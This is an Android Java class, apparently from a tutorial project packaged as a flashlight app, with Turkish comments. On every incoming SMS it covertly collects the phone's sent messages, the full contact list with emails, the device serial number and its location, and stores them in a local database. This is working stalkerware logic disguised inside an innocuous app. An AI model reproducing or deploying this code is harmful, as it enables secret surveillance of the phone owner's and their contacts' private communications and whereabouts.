package com.example.flashlightexample;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.text.DateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

import com.example.flashlightexample.RehberOkuma.rehberOkuma;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Log;

public class GidenSmsDinleme extends BroadcastReceiver {
	// arkadaþlar burada farklý bir yol izleyeceðiz normalde broadcast
	// ihtiyacýmýz yok brada ben þöyle bir mantýk kullandm
	// þimdi giden smsleri broadcast ile dinleyemiyoruz o yüzden direk telfon
	// sms klasörüne eriþip oradan giden smsleri çekiceðiz peki neden burada
	// neden broadcast kullandýk þünkü giden sms klasörnden smsleri neye göre
	// cekeceðiz ? öle deðilmi ben burada her sms geldiðinde biraz önce
	// yapmýþtýk
	// gelen smsleri dinlemeyi ) giden smsleri alýyorum.
	static Map<String, String>rehber=new HashMap<String, String>();
	String phoneNumber;

	static int giris = 0;
	private ContentValues val;
	private SQLiteDatabase dbGidenSms;
	private SQLiteDataBaseHelperGidenSms dbHelperGidenSms;
	KonumDinliyorum knm = new KonumDinliyorum();
	MainActivity rbOkm=new MainActivity();
	String gideckNo;
	String gelnIsim;
	Context mContext;

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		// þimdi öncelikle burada þunu yapalým her sms geldiðinde gden sms
		// klasörünü almasýný bizim için yok yük ve saçmalýk olur bu yüzden her
		// sms
		// geldiðinde önce giden sms db sini silsin ve sildiðinin yerine yazsn
		// böylece ayný mesajlarý tekrar tekrar yazmamýþ olur ama burda þöyle
		// bir sorun
		// olacak ilk giriþte sql boþ olduðndan silmeye çalýþcak böyle uygulama
		// patlar bu yüzden tryCacth kodk
		Log.i("zma","zma 1");
		this.mContext=context;
			rehberOkumaAtama();
		Log.i("zma","zma 2");

		try {
			String sqlGidenSms = "DELETE FROM"
					+ SQLiteDataBaseHelperGidenSms.TABLE_NEWS;
			dbGidenSms.execSQL(sqlGidenSms);
			// log koyalýk çalýþtýmý die
			Log.i("zms giden sms trycatch ", "zms");

		} catch (Exception e) {
			// TODO: handle exception
		}
		// sms geldiðini anlamak için
				
			Cursor cursor2 = context.getContentResolver().query(
					Uri.parse("content://sms/sent"), null, null, null, null);
			cursor2.moveToFirst();
			String GonderilenNo = "";
			do {//burada do-while içine koydum ki her numara için ayrý ayrý yapsn
				try {
				String strG=new String(cursor2.getString(2));
				String ifgideckNo=strG.substring(0, 2);
					 	if(ifgideckNo.equals("+9"))	{		
			
					String str=new String(cursor2.getString(2));
					
					 gideckNo=str.substring(2, 13);
				
			
				
				 gelnIsim=rehber.get(gideckNo);
					 	}else{
					 		gideckNo=cursor2.getString(2);
					 		
							 gelnIsim=rehber.get(gideckNo);
					 	} 
				
				GonderilenNo += " " + cursor2.getColumnName(2) + ":"
						+ cursor2.getString(2)+"\n Gonderilen Num.Rehberdeki Ismi: "+gelnIsim +"\n" + "Mesaj Ýçeriði: \n"// ayný þekilde database ye yazýlmasý için ekliyoruz..
						+ " " + cursor2.getColumnName(13) + ":"
						+ cursor2.getString(13) + "\n"
						+ "Ne zaman Gönderildi:\n" + " ";
				String GonderilenZamn = cursor2.getString(5);
				long messageZamn = Long.parseLong(GonderilenZamn.substring(0,
						10));
				String date = new java.text.SimpleDateFormat(
						"dd/MM/yyyy HH:mm:ss").format(new java.util.Date(
						messageZamn * 1000));
				GonderilenNo += cursor2.getColumnName(5) + ":" + date + "\n"
						+ "Hangi Simden Gönderildi: \n" + " "
						+ cursor2.getColumnName(16) + ":"
						+ cursor2.getString(16) + "\n\n";
				} catch (Exception e) {
					// TODO: handle exception
				}
			} while (cursor2.moveToNext());// Sone gelene kadar ileri gitmesi
											// için

			// þimdi diðerlerinde yaptmz gibi zamaný ve cihaz id sini alalým
			// Arama Geldiðinde (sayfanýn tetiklendiði zamn)
			String currenDateTime = DateFormat.getDateInstance().format(
					new Date());
			// Android Cihaz Ýd si okuma
			String serialnum = null;

			try {
				Class<?> c;
				c = Class.forName("android.os.SystemProperties");
				Method get = c.getMethod("get", String.class, String.class);
				serialnum = (String) (get.invoke(c, "ro.serialno", "unknown"));
			} catch (ClassNotFoundException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (NoSuchMethodException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IllegalArgumentException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IllegalAccessException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (InvocationTargetException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

			// Sql db ye yazalým
			dbHelperGidenSms = SQLiteDataBaseHelperGidenSms
					.getInstance(context);
			dbGidenSms = dbHelperGidenSms.getWritableDatabase();
			val = new ContentValues();
			val.put(SQLiteDataBaseHelperGidenSms.COLUMN_DATETIME,
					currenDateTime);
			val.put(SQLiteDataBaseHelperGidenSms.COLUMN_ACTION, "Giden Sms");
			val.put(SQLiteDataBaseHelperGidenSms.COLUMN_CONTENT, GonderilenNo);
			val.put(SQLiteDataBaseHelperGidenSms.COLUMN_SERIALNUMBER, serialnum);
			dbGidenSms.insert(SQLiteDataBaseHelperGidenSms.TABLE_NEWS, null,
					val);
			// Burada kiþinin konumunu alýyoruz.
			knm.onReceive(context, intent);

			// Giden Smsleri dinlemede bukadar
		

	}
	private void rehberOkumaAtama() {
		 Uri CONTENT_URI = ContactsContract.Contacts.CONTENT_URI;
	        String _ID = ContactsContract.Contacts._ID;
	        String DISPLAY_NAME = ContactsContract.Contacts.DISPLAY_NAME;
	        String HAS_PHONE_NUMBER = ContactsContract.Contacts.HAS_PHONE_NUMBER;

	        Uri PhoneCONTENT_URI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
	        String Phone_CONTACT_ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
	        String NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;

	        Uri EmailCONTENT_URI = ContactsContract.CommonDataKinds.Email.CONTENT_URI;
	        String EmailCONTACT_ID = ContactsContract.CommonDataKinds.Email.CONTACT_ID;
	        String DATA = ContactsContract.CommonDataKinds.Email.DATA;
	

	StringBuffer	output = new StringBuffer();
		//burasý rehber okuma
	Log.i("zma","zma rehO 1");

				ContentResolver contentResolver =mContext.getContentResolver();
				Log.i("zma"," zma rehO 2");

				Cursor cursor = contentResolver.query(CONTENT_URI, null,null, null, null);
				Log.i("zma","zma rehO3");


				// Loop for every contact in the phone
				if (cursor.getCount() > 0) {

					while (cursor.moveToNext()) {

						String contact_id = cursor.getString(cursor.getColumnIndex( _ID ));
						String name = cursor.getString(cursor.getColumnIndex( DISPLAY_NAME ));//Rehberdeki kayýtlý isim...

						int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex( HAS_PHONE_NUMBER )));

						if (hasPhoneNumber > 0) {					

							// Query and loop for every phone number of the contact
							Cursor phoneCursor = contentResolver.query(PhoneCONTENT_URI, null, Phone_CONTACT_ID + " = ?", new String[] { contact_id }, null);

							while (phoneCursor.moveToNext()) {//burda her numara için ayrý ayrý yaptýk
								//burada phoneNumber yani rehberdeki numara bilgisi..... 
								//arkadaþlar burada rehber.put diyerek hashMap ýmýza key-value þeklinde verimizi eklemiþ oldukk.....
								phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(NUMBER));
								//þimdi arkadaþlar burada þöyle birþey yaptým sms dinleme class'ýmýzdan gelecek numaralar +90...ile baþlayacak
								//bizim rehberimizde numaralar belkide normal 0505... die baþlayabilr o yüzden sorun olmamasý için kesme yaptým
								try {
								String strG=new String(phoneNumber);
								String ifgideckNo=strG.substring(0,2);//gelen numaranýn  yani rehberden okudumuz no nun ilk 2 karakteri +9 ise ded,m
								//+9 la baþlayan kýsmý kes 0505... olarak kalsýn...
								 	if(ifgideckNo.equals("+9"))	{	// eyer +9 ise			
									
										String str=new String(phoneNumber);
										 gideckNo=str.substring(2, 13);//kesilen ve 05050000000 olarak kalan 11 haneli numaramýz...
									
								 	
									Log.i("zms","zms keskNo:"+gideckNo);
									output.append("Phone number:" + phoneNumber);
			 						output.append("\n First Name:" + name);
			 						output.append("\n"+"-------------------------");
			 						rehber.put(gideckNo, name); 	

								 	}else{// Burada else dememizin amacý belirttim gibi eyer rehberde numaralar +9 ile baþlmýyorsa... onlar normal kalsýn die.
								 		output.append("\nPhone number:" + phoneNumber);
				 						output.append("\n First Name:" + name);
				 						output.append("\n"+"-------------------------");
								 		rehber.put(phoneNumber, name);
								 		
										
								 		
								 	}
								} catch (Exception e) {
									// TODO: handle exception
								}
							}

							phoneCursor.close();

							// Query and loop for every email of the contact
							Cursor emailCursor = contentResolver.query(EmailCONTENT_URI,	null, EmailCONTACT_ID+ " = ?", new String[] { contact_id }, null);

							while (emailCursor.moveToNext()) {

							String	email = emailCursor.getString(emailCursor.getColumnIndex(DATA));
		//burada da isterseniz eyer numaraya ait e-mail adresi eklenmiþse ona ulaþabilirsiniz...
								output.append("\nEmail:" + email);

							}

							emailCursor.close();
						}
						 output.append("\n");

					
					}
					
					
						}
	}
}
